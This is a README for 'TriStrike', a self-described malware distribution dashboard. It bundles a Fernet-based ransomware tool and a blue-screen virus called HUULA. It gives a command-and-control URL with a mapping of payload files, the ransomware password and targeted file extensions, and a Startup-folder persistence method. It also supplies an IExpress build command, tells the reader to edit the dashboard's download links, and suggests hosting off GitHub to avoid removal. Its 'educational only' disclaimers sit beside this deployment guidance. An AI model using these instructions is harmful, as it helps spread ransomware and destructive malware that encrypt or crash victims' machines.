# TriStrike - Malware Distribution Dashboard

**Ransomware + Virus** - A collection of two distinct malicious tools for Windows systems.

---

## Overview

TriStrike is an integrated malware distribution dashboard that provides two separate attack payloads:

1. **Ransomware** - File encryption/decryption tool using Fernet symmetric encryption
2. **Virus** - Self-extracting BSOD (Blue Screen of Death) payload called HUULA

All payloads are delivered via a web dashboard (`index.html`) that downloads and executes the malicious files.

---

## Components

### 1. RansomwareTool.exe

Located in `Ransomware/`

- **Type**: Educational ransomware simulation
- **Encryption**: Fernet (AES-128 based symmetric encryption)
- **Password**: `here_is_gun`
- **Target Extensions**: `.txt`, `.docx`, `.doc`, `.xlsx`, `.xls`, `.pptx`, `.jpg`, `.png`, `.zip`, `.rar`, `.pdf`
- **Operation**: Encrypts files and renames them with `.locked` extension; decrypts with password
- **Note**: Intended for authorized testing only

### 2. HUULA Virus (BSOD Payload)

Located in `VIRUS/` and `hello/` batch files

- **Type**: BSOD (Blue Screen of Death) inducing virus
- **Delivery**: Self-extracting executable built with IExpress
- **Persistence**: Copies itself to Windows Startup folder
- **Behavior**: Downloads and executes batch/VBS scripts that crash Windows
- **Self-Destruct**: Deletes original files after execution

---

## File Structure

```
hello/
├── index.html          # TriStrike distribution dashboard
├── chaos.bat           # Secondary payload downloader & self-destruct
├── check.vbs           # VBScript trigger for payload execution
├── checker.bat         # File presence verifier
├── code.bat            # Multi-stage payload downloader
├── RUN.bat             # Main entry point with persistence
├── ieexpress.SED       # IExpress configuration file
├── .gitignore          # Git ignore rules for deployment
├── README.md           # This file
├── Ransomware/
│   ├── RansomwareTool.exe
│   └── README.md
└── VIRUS/
    ├── HUULA - VIRUS.EXE
    └── README.md
```

---

## Deployment

### Web Dashboard

Edit `index.html` lines 180-205 to update download URLs:

```html
<a href="YOUR_URL_HERE" class="download-btn btn-1" download="bsod.bat">
```

The dashboard fetches payloads from a remote server and triggers downloads with custom filenames.

### Building the Virus EXE

```cmd
iexpress /N /M "ieexpress.SED"
```

Creates a self-extracting executable that bundles all batch/VBS scripts.

---

## Command & Control Server

Current C2 endpoint: `https://h19qjj92.000webhostapp.com/`

Payload files hosted:
- `code.html` → `bsod.bat`
- `code2.html` → `check.vbs`
- `code3.html` → `code.bat`
- `code4.html` → `dan.bat`
- `code5.html` → `RUN.bat`
- `code6.html` → `checker.bat`

---

## Legal & Ethical Warning

**These tools are for educational and authorized security testing ONLY.**

- Using this software against systems you do not own or lack explicit written authorization is illegal.
- The developer assumes no responsibility for misuse or damages.
- Always test in isolated lab environments with proper authorization.
- Ransomware deployment is a serious criminal offense in virtually all jurisdictions.

---

## GitHub Deployment Notes

**Important**: Hosting malware on GitHub violates their [Acceptable Use Policies](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies). Repositories containing viruses, ransomware, or RATs will be removed. Consider private hosting or authorized research platforms instead.

---

## .gitignore Recommendation

Add this `.gitignore` to prevent tracking temporary/compiled files:

```
# Build outputs
*.exe
*.bat
*.vbs
*.sed
*.p12
*.zip
*.ico

# Compilers
*.o
*.obj
*.pyc
__pycache__/

# IDE
.vscode/
.idea/
*.suo
*.user
*.userosscache

# OS
Thumbs.db
.DS_Store
*.lnk

# Logs
*.log

# Temp files
%TEMP%/
$RECYCLE.BIN/
```

---

## Disclaimer

All information in this repository is provided for educational purposes. You are solely responsible for how you use this software. Unauthorized access to computer systems is illegal under computer fraud and abuse laws worldwide.
